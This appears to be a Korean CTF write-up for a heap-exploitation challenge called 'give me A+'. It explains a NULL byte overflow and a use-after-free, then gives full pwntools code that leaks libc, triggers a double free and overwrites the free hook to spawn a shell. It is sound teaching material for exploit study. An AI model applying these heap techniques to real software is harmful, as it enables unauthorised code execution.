# give me A+

## Analysis

### mitigation

![image](https://user-images.githubusercontent.com/59759771/96176190-f7003980-0f66-11eb-90bc-f18bce13a571.png)

<br>

### vulnerability

![image](https://user-images.githubusercontent.com/59759771/96176292-1e570680-0f67-11eb-8209-58d925e2696d.png)

문자열을 `len`만큼 입력하면 `buf[len + 1] = 0`이 되어 **NULL byte overflow**가 발생한다. 학생의 정보를 저장하는 청크의 구조를 보면, 청크의 가장 마지막에 과목의 이름이 저장된다. 여기서 NULL byte overflow를 발생시켜서 다음 청크의 사이즈 필드에 영향을 줄 수 있다.

<br>

![image](https://user-images.githubusercontent.com/59759771/96177068-409d5400-0f68-11eb-990d-d209087d5a0c.png)

`delete()`에서, 청크를 free할 때 `cnt`는 1 감소하지만 `students`에 저장된 포인터는 없어지지 않는다. 그리고 free를 할 때 `index`와 `cnt`를 비교하는 것이 아니라 `students[index]`가 0인지 아닌지만 검사하기 때문에, 사라지지 않은 포인터에 접근해서 힙의 주소나 libc 주소 등을 leak할 수도 있고, **double free bug**를 발생시킬 수도 있다.

<br>

---

## Exploit

```python
from pwn import *

r = process("./give_me_A+")

def add(name, age, number_of_subjects):
    r.sendlineafter("[+] input menu.\n", 'a')
    r.sendlineafter("[+] input name.\n", name)
    r.sendlineafter("[+] input age.\n", str(age))
    r.sendlineafter("[+] input number of subjects.\n", str(number_of_subjects))

def input_grade(subject_name, score):
    r.sendlineafter("[+] input subject name.", subject_name)
    r.sendlineafter("[+] input score.", str(score))

def delete(index):
    r.sendlineafter("[+] input menu.\n", 'd')
    r.sendlineafter("[+] input student index.\n", str(index))

def print_info(index):
    r.sendlineafter("[+] input menu.\n", 'p')
    r.sendlineafter("[+] input student index.\n", str(index))

def modify(index):
    r.sendlineafter("[+] input menu.\n", 'm')
    r.sendlineafter("[+] input student index.\n", str(index))
```

<br>

### libc leak

unsorted bin에 가장 먼저 들어간 청크의 bk와, 가장 나중에 들어간 청크의 fd에는 `main_arena`의 주소가 저장된다. 저장되는 주소의 오프셋은 libc 버전마다 조금씩 다르다. 이 값을 뽑아내면 libc base를 알아낼 수 있다.

<br>

```python
for i in range(8):
    add("N1be", 21, 13)
    for j in range(13):
        input_grade("", 100)

for i in range(8):
    delete(7 - i)
```

청크 8개를 할당하고 free했다. 과목 개수를 13으로 충분히 크게 할당했기 때문에 unsorted bin에 해당하는 청크가 된다. 7개까지는 티캐시에 들어가고, 남은 한 개는 unsorted bin으로 이동한다.

![image](https://user-images.githubusercontent.com/59759771/96177615-18622500-0f69-11eb-8c14-4e8bcb08f778.png)

<br>

![image](https://user-images.githubusercontent.com/59759771/96177669-2adc5e80-0f69-11eb-9566-3b2c5e5a049a.png)

fd와 bk에 `main_arena+96`의 주소가 들어가있는 것을 확인할 수 있다. `print_info()`를 실행하면 이 주소가 학생의 이름으로 출력될 것이다.

<br>

```python
print_info(0)
r.recvuntil("[+] name: ")
libc = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1ebbe0 # libc base
log.info("libc base: " + hex(libc))
```

![image](https://user-images.githubusercontent.com/59759771/96177797-5eb78400-0f69-11eb-9bf4-22a4c778ae7f.png)

<br>

### double free

과목 개수가 6개이면 청크의 크기는 `0x120`이고, 과목 개수가 5개이면 청크의 크기는 `0x100`이다. `0x120`인 청크를 free했다가 poison NULL byte를 이용하여 사이즈를 `0x100`으로 바꾸고 다시 free하면 double free가 된다.

<br>

```python
add("N1be", 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 6) # index: 1
for i in range(6):
    input_grade("", 100)

delete(1)
modify(0)
for i in range(5):
    input_grade("", 100)
input_grade('a' * 0x1f, 100) # poison NULL byte
delete(1) # double free
```

![image](https://user-images.githubusercontent.com/59759771/96178058-c8379280-0f69-11eb-824f-09e17e9c9906.png)

<br>

### overwrite free hook

double free된 청크의 fd를 free hook의 주소로 덮어서 free hook에 fake chunk를 할당받을 수 있다. free hook을 `system()`의 주소로 덮고, 임의의 청크에 `"/bin/sh"`를 저장해 놓고 free시키면 `system("/bin/sh")`가 실행되어 쉘을 획득할 수 있다.

한 가지 주의할 점은, double free를 시키기 전에 티캐시에 다른 청크를 하나 넣어둬야 한다는 점이다. 그렇게 하지 않으면 시스템이 티캐시에 청크가 하나만 있다고 인식해서, fd를 free hook의 주소로 덮어도 fake chunk를 반환해주지 않고 새로 청크를 할당하게 된다.

<br>

```python
add(p64(freehook), 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("/bin/sh", 21, 5) # index: 1
for i in range(5):
    input_grade("", 100)

add(p64(system), 21, 5) # index: 2
for i in range(5):
    input_grade("", 100)

# get shell
delete(1) # system("/bin/sh")
```

<br>

---

## Full exploit

```python
from pwn import *

r = process("./give_me_A+")

offset_freehook = 0x1eeb28 # offset of free hook from libc base
offset_system = 0x55410 # offset of system() from libc base

def add(name, age, number_of_subjects):
    r.sendlineafter("[+] input menu.\n", 'a')
    r.sendlineafter("[+] input name.\n", name)
    r.sendlineafter("[+] input age.\n", str(age))
    r.sendlineafter("[+] input number of subjects.\n", str(number_of_subjects))

def input_grade(subject_name, score):
    r.sendlineafter("[+] input subject name.", subject_name)
    r.sendlineafter("[+] input score.", str(score))

def delete(index):
    r.sendlineafter("[+] input menu.\n", 'd')
    r.sendlineafter("[+] input student index.\n", str(index))

def print_info(index):
    r.sendlineafter("[+] input menu.\n", 'p')
    r.sendlineafter("[+] input student index.\n", str(index))

def modify(index):
    r.sendlineafter("[+] input menu.\n", 'm')
    r.sendlineafter("[+] input student index.\n", str(index))

# libc leak
for i in range(8):
    add("N1be", 21, 13)
    for j in range(13):
        input_grade("", 100)

for i in range(8):
    delete(7 - i)

print_info(0)
r.recvuntil("[+] name: ")
libc = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1ebbe0 # libc base
log.info("libc base: " + hex(libc))
freehook = libc + offset_freehook # address of free hook
system = libc + offset_system # address of system()

# double free
add("N1be", 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 6) # index: 1
for i in range(6):
    input_grade("", 100)

add("N1be", 21, 5) # index: 2
for i in range(5):
    input_grade("", 100)
delete(2)

delete(1)
modify(0)
for i in range(5):
    input_grade("", 100)
input_grade('a' * 0x1f, 100) # poison NULL byte
delete(1) # double free

# allocate fake chunk on free hook
add(p64(freehook), 21, 6) # index: 0
for i in range(6):
    input_grade("", 100)

add("/bin/sh", 21, 5) # index: 1
for i in range(5):
    input_grade("", 100)

add(p64(system), 21, 5) # index: 2
for i in range(5):
    input_grade("", 100)

# get shell
delete(1) # system("/bin/sh")

r.interactive()
```

![image](https://user-images.githubusercontent.com/59759771/96178600-9115b100-0f6a-11eb-90e3-3007e72f0fbb.png)